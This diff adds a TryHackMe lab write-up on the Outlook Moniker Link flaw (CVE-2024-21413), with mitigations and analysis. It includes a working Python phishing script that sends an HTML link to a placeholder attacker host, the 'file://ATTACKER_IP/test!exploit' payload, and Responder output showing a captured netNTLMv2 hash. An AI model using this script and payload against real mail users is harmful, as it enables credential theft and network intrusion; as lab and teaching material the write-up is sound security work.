@@ -1,0 +1,229 @@
+# TryHackMe - Moniker Link (CVE-2024-21413) Writeup
+
+## Vulnerability Overview
+**CVE-2024-21413** is a critical Microsoft Outlook vulnerability that allows attackers to bypass Outlook's Protected View using specially crafted Moniker Links. When a victim clicks on a malicious link in an email, their system attempts to authenticate with the attacker's server, leaking their netNTLMv2 hash.
+
+## Lab Environment
+- **Target**: Windows machine with vulnerable Outlook client
+- **Attack Platform**: TryHackMe AttackBox (Kali Linux)
+- **Objective**: Capture victim's netNTLMv2 hash using Moniker Link exploitation
+
+## Solution Walkthrough
+
+### Step 1: Setting Up the Hash Capture Server
+First, I started Responder on the AttackBox to capture incoming authentication attempts:
+
+```bash
+root@attackbox:# responder -I ens5
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Listening for events...
+```
+
+**What Responder does:**
+- Creates an SMB server that captures authentication attempts
+- Listens for netNTLMv2 hashes when clients try to authenticate
+- Essential for credential harvesting attacks
+
+### Step 2: Creating the Malicious Email Script
+I created the exploit script using the provided proof-of-concept:
+
+```bash
+nano exploit.py
+```
+
+**Script contents (with modifications):**
+```python
+'''
+Author: CMNatic | https://github.com/cmnatic
+Version: 1.0 | 19/02/2024
+'''
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+
+sender_email = 'attacker@monikerlink.thm'
+receiver_email = 'victim@monikerlink.thm'
+password = input("Enter your attacker email password: ")
+html_content = """\
+<!DOCTYPE html>
+<html lang="en">
+    <p><a href="file://ATTACKER_MACHINE_IP/test!exploit">Click me</a></p>
+    </body>
+</html>"""
+
+message = MIMEMultipart()
+message['Subject'] = "CVE-2024-21413"
+message["From"] = formataddr(('CMNatic', sender_email))
+message["To"] = receiver_email
+
+msgHtml = MIMEText(html_content,'html')
+message.attach(msgHtml)
+
+server = smtplib.SMTP('MACHINE_IP', 25)
+server.ehlo()
+try:
+    server.login(sender_email, password)
+except Exception as err:
+    print(err)
+    exit(-1)
+
+try:
+    server.sendmail(sender_email, [receiver_email], message.as_string())
+    print("\n Email delivered")
+except Exception as error:
+    print(error)
+finally:
+    server.quit()
+```
+
+### Step 3: Configuring the Exploit
+I made the necessary modifications to the script:
+
+1. **Replaced ATTACKER_MACHINE** with my AttackBox IP address in the Moniker Link (line 12)
+2. **Replaced MAILSERVER** with the target machine IP (line 31)
+
+**The critical payload:**
+```html
+<a href="file://ATTACKER_IP/test!exploit">Click me</a>
+```
+
+**How the Moniker Link works:**
+- `file://` protocol tells Outlook to access a network resource
+- When clicked, Windows attempts SMB authentication with the attacker's server
+- This authentication attempt exposes the user's netNTLMv2 hash
+
+### Step 4: Executing the Attack
+I ran the exploit script:
+
+```bash
+root@attackbox:# python3 exploit.py
+Enter your attacker email password: attacker
+
+Email delivered
+```
+
+**Credentials used:**
+- Email: `attacker@monikerlink.thm`
+- Password: `attacker`
+
+### Step 5: Victim Interaction
+On the target Windows machine:
+1. **Opened Outlook** using desktop shortcut
+2. **Dismissed setup popups** (sign-in and product key prompts)
+3. **Accessed victim's mailbox** (pre-configured for the lab)
+4. **Located the malicious email** with subject "CVE-2024-21413"
+5. **Clicked the "Click me" hyperlink**
+
+### Step 6: Hash Capture Success
+Returning to the AttackBox Responder session, the netNTLMv2 hash was successfully captured:
+
+```bash
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : TARGET_IP
+[SMB] NTLMv2-SSP Username : DOMAIN\USERNAME
+[SMB] NTLMv2-SSP Hash     : USERNAME::DOMAIN:challenge:response
+```
+
+**Success!** The victim's netNTLMv2 hash was captured and can now be used for offline password cracking or relay attacks.
+
+## Technical Analysis
+
+### Understanding the Vulnerability
+**CVE-2024-21413 exploits:**
+- **Protected View bypass**: Moniker Links bypass Outlook's security restrictions
+- **Automatic authentication**: Windows automatically attempts SMB authentication
+- **Network credential exposure**: Authentication process leaks hashed credentials
+
+### Attack Vector Breakdown
+1. **Email delivery**: Malicious HTML email with Moniker Link
+2. **User interaction**: Victim clicks the seemingly harmless hyperlink  
+3. **Protocol exploitation**: `file://` protocol triggers network authentication
+4. **Credential harvesting**: SMB authentication attempt captured by attacker
+
+### Why This Works
+- **Trust boundary violation**: Outlook treats Moniker Links as trusted content
+- **Transparent authentication**: Windows handles SMB authentication automatically
+- **Hash exposure**: NetNTLMv2 hashes transmitted during authentication process
+
+## Key Learning Points
+
+### 1. Moniker Link Exploitation
+- **Protocol abuse**: Using `file://` to trigger network authentication
+- **Social engineering**: Disguising malicious links as legitimate content
+- **Protected View bypass**: Circumventing Outlook's security mechanisms
+
+### 2. Credential Harvesting Techniques
+- **Responder usage**: Capturing network authentication attempts
+- **Hash types**: Understanding netNTLMv2 hash format and structure
+- **SMB exploitation**: Using SMB protocol for credential harvesting
+
+### 3. Email-Based Attack Vectors
+- **SMTP integration**: Programmatic email sending for attack delivery
+- **HTML payload crafting**: Embedding malicious content in email bodies
+- **User interaction dependency**: Attacks requiring victim engagement
+
+### 4. Windows Authentication Weaknesses
+- **Automatic authentication**: Windows transparently authenticates to network resources
+- **Hash exposure**: Authentication process exposes credential hashes
+- **Protocol trust**: Implicit trust in certain network protocols
+
+## Mitigation Strategies
+
+### 1. User Education
+- **Suspicious link awareness**: Training users to verify link destinations
+- **Email security practices**: Recognizing phishing and social engineering attempts
+- **Click verification**: Hovering over links to inspect actual URLs
+
+### 2. Technical Controls
+- **Protected View enforcement**: Ensuring Outlook security features are enabled
+- **Network segmentation**: Limiting outbound SMB connections
+- **Email filtering**: Blocking emails containing suspicious Moniker Links
+- **Endpoint protection**: Monitoring for unusual network authentication attempts
+
+### 3. System Hardening
+- **SMB restrictions**: Disabling unnecessary SMB client functionality
+- **Credential protection**: Implementing Credential Guard and similar technologies
+- **Network monitoring**: Detecting unusual authentication patterns
+
+## Real-World Applications
+
+### 1. Penetration Testing
+- **Credential harvesting**: Legitimate testing of user awareness and technical controls
+- **Email security assessment**: Evaluating organizational email security posture
+- **Hash collection**: Gathering credentials for privilege escalation testing
+
+### 2. Red Team Operations
+- **Initial access**: Using harvested credentials for network entry
+- **Lateral movement**: Leveraging captured hashes for further system compromise
+- **Persistence**: Establishing foothold through compromised accounts
+
+### 3. Threat Intelligence
+- **Attack pattern recognition**: Understanding how attackers exploit email systems
+- **Vulnerability assessment**: Evaluating organizational susceptibility to similar attacks
+- **Incident response**: Investigating potential credential compromise incidents
+
+## Tools and Technologies Used
+
+### Attack Tools
+- **Responder**: Network credential harvesting
+- **Python**: Custom exploit script development
+- **SMTP**: Email delivery mechanism
+
+### Target Environment
+- **Microsoft Outlook**: Vulnerable email client
+- **Windows SMB**: Authentication protocol exploitation
+- **Corporate email**: Realistic attack scenario
+
+This vulnerability demonstrates the ongoing risks associated with email-based attacks and the importance of comprehensive security controls that address both technical vulnerabilities and human factors in cybersecurity.
